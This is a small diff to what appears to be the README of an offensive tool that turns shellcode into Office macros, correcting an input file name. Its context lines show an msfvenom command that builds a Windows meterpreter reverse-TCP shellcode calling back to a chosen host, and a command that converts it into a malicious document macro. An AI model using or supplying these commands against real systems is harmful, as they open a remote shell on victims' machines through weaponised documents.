@@ -225,5 +225,5 @@ The following command provides some sane defaults that will generate the raw tex
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.x.y LPORT=80 EXITFUNC=thread -f raw > shellcode.bin
 ```
 ```powershell
-.\BadAssMacrosx86.exe -i shellcode.txt -w doc -p no -s indirect -c 10 -o macro.txt
+.\BadAssMacrosx86.exe -i shellcode.bin -w doc -p no -s indirect -c 10 -o macro.txt
 ```
